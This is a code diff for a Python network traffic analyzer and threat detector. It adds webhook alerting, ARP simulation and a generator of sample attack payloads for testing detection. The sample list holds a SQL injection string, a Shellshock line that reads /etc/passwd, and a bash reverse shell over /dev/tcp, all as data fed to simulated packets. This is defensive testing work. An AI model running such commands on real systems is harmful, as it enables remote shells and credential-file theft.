@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
-import os
-import sys
+from security_integrations import SecurityToolIntegrator
 import logging
+import sys
+import signal
 import time
-from scapy.all import IP, TCP, UDP, ICMP, Raw
+import random
+from scapy.all import IP, TCP, UDP, ICMP, Raw, ARP
 from packet_analyzer import PacketAnalyzer
 from threat_detector import ThreatDetector
 from stats_collector import StatsCollector
 from visualizer import Visualizer
-import signal
-import random
 from ml_analyzer import MLAnalyzer
 from database import DatabaseManager
+from notifier import NotificationManager
 
 # Configure logging
 logging.basicConfig(
@@ -29,6 +30,8 @@ class NetworkAnalyzer:
         self.visualizer = Visualizer()
         self.ml_analyzer = MLAnalyzer()
         self.db_manager = DatabaseManager()
+        self.notifier = NotificationManager()
+        self.security_integrator = SecurityToolIntegrator()
 
         # Register signal handlers
         signal.signal(signal.SIGINT, self.signal_handler)
@@ -45,73 +48,112 @@ class NetworkAnalyzer:
         if not self.running:
             return
 
-        # Analyze packet
-        packet_info = self.packet_analyzer.analyze_packet(packet)
-        if packet_info:
-            # Log packet to database
-            self.db_manager.log_packet(packet_info)
+        try:
+            # Analyze packet
+            packet_info = self.packet_analyzer.analyze_packet(packet)
+            if packet_info:
+                # Log packet to database
+                self.db_manager.log_packet(packet_info)
 
-            # Traditional threat detection
-            threats = self.threat_detector.detect_threats(packet_info)
-            if threats:
-                for threat in threats:
-                    logger.warning(f"Potential threat detected: {threat}")
-                    self.db_manager.log_threat(threat)
+                # Traditional threat detection
+                threats = self.threat_detector.detect_threats(packet_info)
 
-            # ML-based anomaly detection
-            anomalies = self.ml_analyzer.detect_anomalies(packet_info)
-            if anomalies:
-                for anomaly in anomalies:
-                    logger.warning(f"Anomaly detected: {anomaly}")
-                    self.db_manager.log_anomaly(
-                        anomaly,
-                        self.ml_analyzer.extract_features(packet_info),
-                        self.ml_analyzer.baseline_stats
-                    )
+                # External security tool analysis
+                security_threats = self.security_integrator.analyze_packet(packet_info)
+                if security_threats:
+                    threats.extend(security_threats)
 
-            # Update statistics
-            self.stats_collector.update_stats(packet_info)
+                if threats:
+                    for threat in threats:
+                        logger.warning(f"Potential threat detected: {threat}")
+                        self.db_manager.log_threat(threat)
+                        # Send notifications for high severity threats
+                        if threat.get('severity') in ['high', 'critical']:
+                            self.notifier.send_alert(threat, channels=['webhook'])
 
-            # Update visualization
-            if self.stats_collector.packet_count % 100 == 0:
-                self.visualizer.update_display(self.stats_collector.get_stats())
+                # ML-based anomaly detection
+                anomalies = self.ml_analyzer.detect_anomalies(packet_info)
+                if anomalies:
+                    for anomaly in anomalies:
+                        logger.warning(f"Anomaly detected: {anomaly}")
+                        self.db_manager.log_anomaly(
+                            anomaly,
+                            self.ml_analyzer.extract_features(packet_info),
+                            self.ml_analyzer.baseline_stats
+                        )
+                        # Send notifications for high confidence anomalies
+                        if anomaly.get('confidence', 0) > 0.8:
+                            self.notifier.send_alert(anomaly, channels=['webhook'])
+
+                # Update statistics
+                self.stats_collector.update_stats(packet_info)
+
+                # Update visualization
+                if self.stats_collector.packet_count % 100 == 0:
+                    self.visualizer.update_display(self.stats_collector.get_stats())
+
+        except Exception as e:
+            logger.error(f"Error processing packet: {e}")
 
     def generate_sample_packet(self, protocol='TCP'):
         """Generate a sample packet for testing"""
-        # Generate more realistic source and destination IPs
         src_ip = f"192.168.1.{random.randint(1, 254)}"
         dst_ip = f"10.0.0.{random.randint(1, 254)}"
 
         if protocol == 'TCP':
-            # Generate random ports for more realistic traffic
             sport = random.randint(1024, 65535)
             dport = random.choice([80, 443, 8080, 22, 21])  # Common service ports
-            # Mix of different TCP flags
             flags = random.choice(['S', 'SA', 'A', 'PA', 'FA'])
-            return IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags=flags)
+            payload = b"" if random.random() > 0.2 else self._generate_sample_payload()
+            packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags=flags)
+            if payload:
+                packet = packet/Raw(load=payload)
+            return packet
         elif protocol == 'UDP':
-            # Common UDP services
             sport = random.randint(1024, 65535)
             dport = random.choice([53, 67, 68, 123, 161])  # DNS, DHCP, NTP, SNMP
-            return IP(src=src_ip, dst=dst_ip)/UDP(sport=sport, dport=dport)/Raw(load='Sample payload')
+            payload = self._generate_sample_payload() if random.random() > 0.5 else b""
+            return IP(src=src_ip, dst=dst_ip)/UDP(sport=sport, dport=dport)/Raw(load=payload)
         elif protocol == 'ICMP':
-            # Different ICMP types
             icmp_type = random.choice([0, 8])  # Echo reply or request
             return IP(src=src_ip, dst=dst_ip)/ICMP(type=icmp_type)
+        elif protocol == 'ARP':
+            return ARP(
+                psrc=src_ip,
+                pdst=dst_ip,
+                hwsrc=self._generate_mac(),
+                hwdst=self._generate_mac(),
+                op=random.choice([1, 2])  # 1=request, 2=reply
+            )
         return None
+
+    def _generate_mac(self):
+        """Generate a random MAC address"""
+        return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
+
+    def _generate_sample_payload(self):
+        """Generate sample payload for testing different attack patterns"""
+        payloads = [
+            b"GET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
+            b"SELECT * FROM users WHERE id = 1 OR '1'='1'",
+            b"() { :; }; /bin/bash -c 'cat /etc/passwd'",
+            b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            b"SMBv1\x00\x00\x00\x00",
+            b"A" * 1000  # Buffer overflow attempt
+        ]
+        return random.choice(payloads)
 
     def simulate_traffic(self):
         """Simulate network traffic for testing"""
         logger.info("Starting traffic simulation...")
-        protocols = ['TCP', 'UDP', 'ICMP']
+        protocols = ['TCP', 'UDP', 'ICMP', 'ARP']
         packet_count = 0
 
         # Add weights to make TCP more common
-        protocol_weights = [0.6, 0.3, 0.1]  # 60% TCP, 30% UDP, 10% ICMP
+        protocol_weights = [0.6, 0.3, 0.05, 0.05]  # 60% TCP, 30% UDP, 5% ICMP, 5% ARP
 
         try:
             while self.running and packet_count < 1000:  # Simulate 1000 packets
-                # Select protocol based on weights
                 protocol = random.choices(protocols, weights=protocol_weights)[0]
 
                 if not self.running:
